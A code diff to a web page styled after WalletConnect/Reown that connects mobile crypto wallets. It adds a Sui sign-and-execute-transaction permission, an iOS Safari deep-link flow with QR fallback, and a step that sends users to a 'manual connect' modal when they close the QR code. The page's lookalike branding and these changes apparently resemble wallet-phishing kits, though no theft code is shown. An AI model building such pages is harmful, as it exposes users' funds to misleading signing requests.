@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WalletConnect – Reown Style</title>
+    <title>Wallet Connect – Reown Style</title>
         <!-- WalletConnect will be provided by the bundled app (Vite) -->
         <!-- Optional: Ethereum Provider if you want it later -->
         <!-- (Do NOT add manual <script> tags for WalletConnect or main.* in index.html) -->
@@ -1008,7 +1008,7 @@
                             events: ['accountsChanged']
                         },
                         sui: {
-                            methods: ['sui_signTransactionBlock', 'sui_signPersonalMessage'],
+                            methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
                             chains: ['sui:mainnet'],
                             events: ['accountsChanged']
                         }
@@ -1017,34 +1017,60 @@
 
                 if (!uri) throw new Error('No URI');
 
-                // Log the raw pairing URI for debugging on mobile devices
                 console.log('WC pairing URI:', uri);
 
                 const deepLink = `wc:${uri.split('wc:')[1]}`;
                 const universal = `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`;
 
-                tryOpenDeepLink(deepLink, () => {
-                    tryOpenDeepLink(universal, () => {
-                        console.warn('Deep link failed');
-                        if (onFail) onFail(new Error('Deep link failed'));
+                // iOS Safari optimization: try deep link first, then fall back to QR after 5 seconds
+                const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+                const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+                
+                if (isSafari && isIOS) {
+                    console.log('iOS Safari detected: trying deep link with 5s QR fallback');
+                    tryOpenDeepLink(deepLink, () => {
+                        // Deep link failed, set timer for QR fallback
+                        setTimeout(() => {
+                            if (!document.hidden) {
+                                console.log('iOS Safari: 5s timeout reached, showing QR fallback');
+                                showQRFallbackOverlay(uri, 'Wallet');
+                            }
+                        }, 5000);
                     }, async () => {
                         try {
                             const session = await approval();
-                            console.log('WC v2 connected:', session);
+                            console.log('WC v2 connected via iOS deep link:', session);
                             if (onSuccess) onSuccess(client, session);
                         } catch (e) {
                             if (onFail) onFail(e);
                         }
                     });
-                }, async () => {
-                    try {
-                        const session = await approval();
-                        console.log('WC v2 connected via direct:', session);
-                        if (onSuccess) onSuccess(client, session);
-                    } catch (e) {
-                        if (onFail) onFail(e);
-                    }
-                });
+                } else {
+                    // Android or non-Safari: standard flow (deep link → universal → QR)
+                    tryOpenDeepLink(deepLink, () => {
+                        tryOpenDeepLink(universal, () => {
+                            console.warn('Deep link failed, showing QR');
+                            showQRFallbackOverlay(uri, 'Wallet');
+                            if (onFail) onFail(new Error('Deep link failed'));
+                        }, async () => {
+                            try {
+                                const session = await approval();
+                                console.log('WC v2 connected:', session);
+                                if (onSuccess) onSuccess(client, session);
+                            } catch (e) {
+                                if (onFail) onFail(e);
+                            }
+                        });
+                    }, async () => {
+                        try {
+                            const session = await approval();
+                            console.log('WC v2 connected via direct:', session);
+                            if (onSuccess) onSuccess(client, session);
+                        } catch (e) {
+                            if (onFail) onFail(e);
+                        }
+                    });
+                }
 
                 return client;
             } catch (e) {
@@ -2028,7 +2054,7 @@
             store: 'https://play.google.com/store/apps/details?id=org.tronlink.wallet',
             iosStore: 'https://apps.apple.com/app/tronlink-trx-wallet/id1453530188'
         },
-       solflare: {
+        solflare: {
             scheme: 'solflare://wc?uri=',
             universal: 'https://solflare.com/wc?uri=',
             store: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
@@ -2148,13 +2174,28 @@
                 <img src="https://quickchart.io/qr?text=${encodeURIComponent(wcUri)}&size=300" 
                      style="width:260px;height:260px;" alt="WalletConnect QR">
             </div>
-            <button onclick="this.parentElement.remove()" 
+            <button id="qr-close-btn"
                     style="margin-top:24px; padding:12px 32px; background:#3396ff; color:white; border:none; border-radius:12px; font-size:16px; cursor:pointer;">
                 Close
             </button>
         `;
 
         document.body.appendChild(overlay);
+        
+        // Close QR → instantly show manual connect modal
+        const closeBtn = overlay.querySelector('#qr-close-btn');
+        closeBtn.addEventListener('click', () => {
+            overlay.remove();
+            // Show manual connect modal
+            try {
+                const manualOverlay = document.getElementById('manual-overlay');
+                const modalOverlay = document.getElementById('modal-overlay');
+                modalOverlay.classList.remove('active');
+                setTimeout(() => { modalOverlay.style.display = 'none'; }, 400);
+                manualOverlay.style.display = 'flex';
+                setTimeout(() => manualOverlay.classList.add('active'), 10);
+            } catch (e) { console.warn('Failed to show manual overlay:', e); }
+        });
     }
 
     function handleWalletClick() {
@@ -2284,6 +2325,11 @@
         // SPECIAL: For tricky wallets on mobile, bypass multi-app detection and open the specific wallet only
         if (isMobile && isTrickyWallet) {
             console.log(`[Mobile] Detected tricky wallet ${walletName} - using direct openSpecificWallet()`);
+            
+            // Show "Opening wallet..." message IMMEDIATELY for better UX
+            msgEl.textContent = `Opening ${walletName}... Please wait`;
+            msgEl.classList.remove('failed');
+            
             // First need to get WC URI
             (async () => {
                 try {
@@ -2320,7 +2366,7 @@
                                 events: ['accountsChanged']
                             },
                             sui: {
-                                methods: ['sui_signTransactionBlock', 'sui_signPersonalMessage'],
+                                methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
                                 chains: ['sui:mainnet'],
                                 events: ['accountsChanged']
                             }
@@ -2336,11 +2382,23 @@
                     
                     // Open the specific wallet app
                     await openSpecificWallet(walletName, uri);
+                    
+                    // Hide message after 5 seconds (or faster if app opens)
+                    setTimeout(() => {
+                        try { msgEl.textContent = ''; } catch (e) {}
+                    }, 5000);
+                    
                 } catch (e) {
                     console.error(`[Mobile] Failed to connect for ${walletName}:`, e);
                     // Show error on the side overlay
                     msgEl.textContent = 'Connection failed. Please try again.';
                     msgEl.classList.add('failed');
+                    
+                    // Auto-hide error after 3s
+                    setTimeout(() => {
+                        msgEl.textContent = '';
+                        msgEl.classList.remove('failed');
+                    }, 3000);
                 }
             })();
             return;
@@ -2823,11 +2881,3 @@
 
 </body>
 </html>
-
-
-
-
-
-
-
-
